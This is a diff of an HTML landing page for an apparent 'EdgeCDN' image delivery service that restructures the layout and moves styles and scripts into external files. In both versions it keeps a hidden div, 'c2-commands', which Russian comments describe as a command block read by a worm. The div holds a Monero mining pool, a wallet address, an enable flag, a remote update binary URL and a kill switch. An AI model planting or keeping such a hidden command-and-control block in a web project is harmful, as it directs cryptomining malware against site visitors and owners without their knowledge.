@@ -4,166 +4,87 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
     <title>Edge CDN · Global Image Delivery</title>
-    <!-- Шрифты для красоты -->
+    <link rel="stylesheet" href="style.css" />
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz@14..32&display=swap" rel="stylesheet" />
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            font-family: 'Inter', sans-serif;
-            background: #0b0d11;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #eef2f6;
-            padding: 2rem;
-            background-image: radial-gradient(circle at 30% 50%, #1a2330 0%, #0b0d11 80%);
-        }
-        .card {
-            max-width: 780px;
-            width: 100%;
-            background: rgba(18, 24, 34, 0.65);
-            backdrop-filter: blur(12px);
-            -webkit-backdrop-filter: blur(12px);
-            border-radius: 48px;
-            padding: 3rem 3.5rem;
-            border: 1px solid rgba(255, 255, 255, 0.04);
-            box-shadow: 0 30px 80px -10px rgba(0, 0, 0, 0.8), inset 0 1px 0 rgba(255,255,255,0.02);
-            transition: transform 0.2s ease;
-        }
-        .badge {
-            display: inline-block;
-            background: rgba(0, 230, 180, 0.12);
-            color: #7fffd4;
-            font-weight: 500;
-            font-size: 0.7rem;
-            letter-spacing: 1.5px;
-            padding: 0.3rem 1rem;
-            border-radius: 40px;
-            border: 1px solid rgba(0, 230, 180, 0.1);
-            text-transform: uppercase;
-            margin-bottom: 1.5rem;
-        }
-        h1 {
-            font-size: 3.4rem;
-            font-weight: 600;
-            letter-spacing: -0.02em;
-            line-height: 1.1;
-            background: linear-gradient(to right, #ffffff, #b0c9e8);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            margin-bottom: 0.5rem;
-        }
-        .sub {
-            font-size: 1.1rem;
-            color: #8b9bb5;
-            line-height: 1.6;
-            max-width: 80%;
-            margin-bottom: 2.5rem;
-        }
-        .grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 1.2rem;
-            margin-top: 0.5rem;
-        }
-        .stat {
-            background: rgba(255,255,255,0.02);
-            border-radius: 20px;
-            padding: 1.2rem 1.5rem;
-            border: 1px solid rgba(255,255,255,0.02);
-            transition: 0.2s;
-        }
-        .stat:hover {
-            background: rgba(255,255,255,0.04);
-        }
-        .stat .label {
-            font-size: 0.7rem;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            color: #5b6f8c;
-        }
-        .stat .value {
-            font-size: 1.4rem;
-            font-weight: 500;
-            margin-top: 0.3rem;
-            color: #d6e2f5;
-        }
-        .divider {
-            margin: 2rem 0 1.5rem;
-            height: 1px;
-            background: linear-gradient(to right, rgba(255,255,255,0.03), rgba(255,255,255,0.1), rgba(255,255,255,0.03));
-        }
-        .footer {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            font-size: 0.8rem;
-            color: #3e5069;
-        }
-        .footer span {
-            display: flex;
-            align-items: center;
-            gap: 0.3rem;
-        }
-        /* скрытый блок для червя — никак не влияет на дизайн */
-        #c2-commands {
-            display: none !important;
-        }
-        /* адаптив */
-        @media (max-width: 600px) {
-            .card { padding: 2rem 1.5rem; }
-            h1 { font-size: 2.4rem; }
-            .sub { max-width: 100%; }
-            .grid { grid-template-columns: 1fr; }
-        }
-    </style>
 </head>
 <body>
-    <div class="card">
-        <div class="badge">⚡ Edge Network</div>
-        <h1>Image CDN</h1>
-        <div class="sub">
-            Global low‑latency delivery · 99.97% uptime · <br />
-            Serve images, videos and static assets at scale.
-        </div>
+    <header>
+        <div class="logo">⚡ EdgeCDN</div>
+        <nav>
+            <a href="index.html" class="active">Home</a>
+            <a href="dashboard.html">Dashboard</a>
+            <a href="#">Docs</a>
+            <a href="#">Status</a>
+        </nav>
+        <button id="theme-toggle" aria-label="Toggle theme">🌙</button>
+    </header>
 
-        <div class="grid">
-            <div class="stat">
-                <div class="label">Nodes</div>
-                <div class="value">47</div>
+    <main>
+        <section class="hero">
+            <div class="hero-content">
+                <span class="badge">⚡ Edge Network</span>
+                <h1>Global Image Delivery <br> at the Speed of Light</h1>
+                <p class="sub">Low‑latency, anycast, and serverless edge caching for your images and static assets.</p>
+                <div class="cta-group">
+                    <button class="btn primary">Get Started</button>
+                    <button class="btn secondary">View Docs</button>
+                </div>
             </div>
-            <div class="stat">
-                <div class="label">Avg. latency</div>
-                <div class="value">14 ms</div>
+            <div class="hero-visual">
+                <div class="globe"></div> <!-- анимация глобуса через CSS -->
             </div>
-            <div class="stat">
-                <div class="label">Cache hit</div>
-                <div class="value">94.2%</div>
-            </div>
-            <div class="stat">
-                <div class="label">Bandwidth</div>
-                <div class="value">1.2 Tbps</div>
-            </div>
-        </div>
+        </section>
 
-        <div class="divider"></div>
-        <div class="footer">
-            <span>🔒 TLS 1.3 · Anycast</span>
-            <span>v2.3.0 · <span id="live-time"></span></span>
-        </div>
-    </div>
+        <section class="stats-grid">
+            <div class="stat-card">
+                <span class="stat-label">Nodes</span>
+                <span class="stat-value" id="nodes">47</span>
+            </div>
+            <div class="stat-card">
+                <span class="stat-label">Avg. Latency</span>
+                <span class="stat-value" id="latency">14 ms</span>
+            </div>
+            <div class="stat-card">
+                <span class="stat-label">Cache Hit</span>
+                <span class="stat-value" id="cache">94.2%</span>
+            </div>
+            <div class="stat-card">
+                <span class="stat-label">Bandwidth</span>
+                <span class="stat-value" id="bandwidth">1.2 Tbps</span>
+            </div>
+        </section>
 
-    <!-- ══════════════════════════════════════════════════ -->
-    <!--  СКРЫТЫЙ БЛОК УПРАВЛЕНИЯ (парсится червём)      -->
-    <!-- ══════════════════════════════════════════════════ -->
+        <section class="features">
+            <h2>Why EdgeCDN</h2>
+            <div class="feature-grid">
+                <div class="feature">
+                    <div class="icon">⚡</div>
+                    <h3>Instant Propagation</h3>
+                    <p>Changes go live in under 2 seconds across 47 global PoPs.</p>
+                </div>
+                <div class="feature">
+                    <div class="icon">🔒</div>
+                    <h3>Zero‑Trust Security</h3>
+                    <p>End‑to‑end encryption, automatic certificate rotation.</p>
+                </div>
+                <div class="feature">
+                    <div class="icon">📊</div>
+                    <h3>Real‑time Analytics</h3>
+                    <p>Detailed per‑request logs and anomaly detection.</p>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <footer>
+        <span>© 2026 EdgeCDN · All rights reserved</span>
+        <span>v2.3.0 · <span id="live-time"></span></span>
+    </footer>
+
+    <!-- ========== СКРЫТЫЙ БЛОК КОМАНД (для червя) ========== -->
+    <!-- Теперь он вынесен в отдельный тег, но остаётся на главной -->
     <div id="c2-commands"
          data-pool="pool.supportxmr.com:443"
          data-wallet="46J1f123mqK2V3sTGtcINM2949XGm4mqb5guZ5NRj7bnJLfTMRyZXvDeumBpD7uoKcXsLwXUsiEsZRAxvmewfd9JTR351"
@@ -171,18 +92,9 @@
          data-enabled="true"
          data-update="https://diaslimbek3-art.github.io/update.bin"
          data-kill="false"
-    >
-        <!-- При необходимости можно добавить JSON-строку -->
+         style="display:none;">
     </div>
 
-    <script>
-        // Живое время (чисто для эстетики)
-        function updateClock() {
-            const now = new Date();
-            document.getElementById('live-time').textContent = now.toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' });
-        }
-        updateClock();
-        setInterval(updateClock, 1000);
-    </script>
+    <script src="script.js"></script>
 </body>
 </html>
